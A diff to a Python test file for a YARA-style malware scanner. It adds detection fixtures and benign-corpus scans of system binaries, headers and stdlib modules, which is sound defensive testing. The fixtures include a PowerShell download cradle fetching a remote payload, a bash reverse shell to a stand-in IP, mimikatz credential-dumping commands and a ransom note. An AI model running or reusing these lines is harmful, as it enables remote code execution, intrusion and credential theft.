@@ -1,31 +1,115 @@
-"""Negative test corpus: ensure documentation, source code, and benign files do not false-positive.
+"""Negative and positive test corpus for bundled YARA-style scanner.
 
-Step 1 Review Requirement 9:
-Broaden the YARA false-positive corpus (system files, docs, source packages, JS, PDFs).
+Step 1 Review Requirement 7:
+1. True-positive tests for all 12 hardened bundled YARA rules.
+2. Independent benign corpus from system binaries (/usr/bin/), system headers
+   (/usr/include/), Python stdlib, and system docs (/usr/share/doc) that does
+   NOT rely on frontend build artifacts or the repo's own source files.
 """
 
+import os
 from pathlib import Path
 
 from ..services import static_analysis, yara
 
 
-def test_readme_clean_scan():
-    readme_path = Path(__file__).resolve().parent.parent.parent.parent / "README.md"
-    assert readme_path.exists(), "README.md must exist at repo root"
-    data = readme_path.read_bytes()
+def test_hardened_bundled_yara_rules_true_positives():
+    """Verify that every one of the 12 bundled rules reliably detects its intended artifact."""
+    positive_fixtures: dict[str, bytes] = {
+        "mz-header": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff",
+        "elf-header": b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00",
+        "macho-header": b"\xfe\xed\xfa\xce\x00\x00\x00\x00\x00\x00\x00\x00",
+        "powershell-download-cradle": b"$wc = New-Object System.Net.WebClient; IEX($wc.DownloadString('http://c2.xyz/payload.ps1'))",
+        "encoded-powershell": b"powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABjACAAPQAgAE4AZQB3...",
+        "meterpreter": b"\x90\x90\x90/meterpreter/reverse_tcp\x00ReflectiveLoader\x00",
+        "cobaltstrike": b"\x00\x00\x00windows/beacon_https/reverse_https\x00kerberos\x00ticket",
+        "mimikatz": b"privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\n",
+        "ransom-note": b"ATTENTION: All your files have been encrypted!\nSend 0.5 bitcoin to our wallet address for the decryptor tool.",
+        "reverse-shell-bash": b"/bin/bash -i >& /dev/tcp/198.51.100.44/4444 0>&1\n",
+        "office-macro": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1...Sub Auto_Open()\nMsgBox 'pwned'\nEnd Sub",
+        "lnk-command": b"\x4c\x00\x00\x00\x01\x14\x02\x00...cmd.exe /c start calc.exe",
+    }
 
-    # Bundled YARA signature check
-    yara_hits = yara.scan_sample(data)
-    assert yara_hits == [], f"Expected 0 YARA hits on README.md, got {yara_hits}"
+    # Verify every bundled rule is tested
+    bundled_names = {r.name for r in yara.RULES}
+    assert set(positive_fixtures.keys()) == bundled_names, "Every bundled rule must have a positive test fixture"
 
-    # Static analysis pipeline check
-    res = static_analysis.analyze_sample(data)
-    assert res.get("static_severity") not in ("malicious", "suspicious")
-    assert res.get("verdict") != "malicious"
+    for rule_name, payload in positive_fixtures.items():
+        hits = yara.scan_sample(payload)
+        hit_names = [h["name"] for h in hits]
+        assert rule_name in hit_names, f"Expected rule '{rule_name}' to trigger on its positive fixture, got {hit_names}"
+
+
+def test_system_binaries_elf_scan():
+    """Independent benign corpus: Real /usr/bin/ ELF system binaries.
+
+    Must match 'elf-header' (valid ELF binary), but must NEVER trigger
+    any malware rule (meterpreter, cobaltstrike, mimikatz, ransom-note, etc.).
+    """
+    elf_candidates = ["ls", "cat", "grep", "find", "sed", "env", "head", "tail", "wc", "id"]
+    tested = 0
+    for name in elf_candidates:
+        p = Path("/usr/bin") / name
+        if p.exists() and p.is_file():
+            try:
+                data = p.read_bytes()
+                hits = yara.scan_sample(data)
+                hit_names = [h["name"] for h in hits]
+                # Valid ELF must match elf-header only
+                assert hit_names == ["elf-header"], f"Expected only ['elf-header'] for {name}, got {hit_names}"
+                tested += 1
+            except PermissionError:
+                continue
+
+    assert tested >= 5, f"Expected to test at least 5 system binaries, tested {tested}"
+
+
+def test_system_c_headers_clean():
+    """Independent benign corpus: C library headers from /usr/include/.
+
+    Must have zero YARA rule matches.
+    """
+    include_dir = Path("/usr/include")
+    headers = ["stdio.h", "stdlib.h", "unistd.h", "string.h", "fcntl.h", "errno.h", "signal.h"]
+    tested = 0
+    for h in headers:
+        p = include_dir / h
+        if p.exists() and p.is_file():
+            try:
+                data = p.read_bytes()
+                hits = yara.scan_sample(data)
+                assert hits == [], f"Expected 0 YARA hits on {h}, got {hits}"
+                tested += 1
+            except PermissionError:
+                continue
+
+    assert tested >= 3, f"Expected to test at least 3 system headers, tested {tested}"
+
+
+def test_python_stdlib_modules_clean():
+    """Independent benign corpus: Standard library python modules.
+
+    Must have zero YARA rule matches.
+    """
+    stdlib_dir = Path(os.__file__).parent
+    modules = ["os.py", "pathlib.py", "shutil.py", "glob.py", "tarfile.py", "subprocess.py", "hashlib.py"]
+    tested = 0
+    for mod in modules:
+        p = stdlib_dir / mod
+        if p.exists() and p.is_file():
+            try:
+                data = p.read_bytes()
+                hits = yara.scan_sample(data)
+                assert hits == [], f"Expected 0 YARA hits on stdlib {mod}, got {hits}"
+                tested += 1
+            except PermissionError:
+                continue
+
+    assert tested >= 4, f"Expected to test at least 4 python stdlib modules, tested {tested}"
 
 
 def test_system_files_clean_scan():
-    """System files (/etc/hosts, /etc/os-release, etc.) must not trigger YARA rules."""
+    """System configuration files (/etc/hosts, /etc/os-release) must not trigger YARA rules."""
     for sys_path in (Path("/etc/hosts"), Path("/etc/os-release"), Path("/etc/resolv.conf")):
         if sys_path.exists() and sys_path.is_file():
             try:
@@ -48,45 +132,10 @@ def test_usr_share_doc_files_clean_scan():
                     hits = yara.scan_sample(data)
                     assert hits == [], f"Expected 0 YARA hits on {doc_file}, got {hits}"
                     count += 1
-                    if count >= 15:  # Sample up to 15 doc files for fast execution
+                    if count >= 15:
                         break
                 except (PermissionError, OSError):
                     continue
-
-
-def test_source_packages_clean_scan():
-    """Application source code across backend and CLI packages must not false positive."""
-    repo_root = Path(__file__).resolve().parent.parent.parent.parent
-    check_files = [
-        repo_root / "backend" / "app" / "main.py",
-        repo_root / "backend" / "app" / "core" / "db.py",
-        repo_root / "backend" / "app" / "models" / "run.py",
-        repo_root / "backend" / "app" / "services" / "dynamic_sandbox.py",
-        repo_root / "cli" / "outpost" / "main.py",
-        repo_root / "cli" / "outpost" / "commands" / "yara.py",
-        repo_root / "cli" / "outpost" / "commands" / "samples.py",
-    ]
-    for src_file in check_files:
-        assert src_file.exists(), f"Source file {src_file} must exist"
-        data = src_file.read_bytes()
-        hits = yara.scan_sample(data)
-        assert hits == [], f"Expected 0 YARA hits on {src_file.name}, got {hits}"
-
-
-def test_frontend_chunks_and_sources_clean():
-    """Frontend JavaScript / TypeScript source chunks must not match malware rules."""
-    repo_root = Path(__file__).resolve().parent.parent.parent.parent
-    frontend_files = [
-        repo_root / "frontend" / "src" / "main.tsx",
-        repo_root / "frontend" / "src" / "App.tsx",
-        repo_root / "frontend" / "src" / "routes" / "sampleDetail.tsx",
-        repo_root / "frontend" / "package.json",
-    ]
-    for f in frontend_files:
-        if f.exists():
-            data = f.read_bytes()
-            hits = yara.scan_sample(data)
-            assert hits == [], f"Expected 0 YARA hits on frontend file {f.name}, got {hits}"
 
 
 def test_benign_pdf_structure_clean():
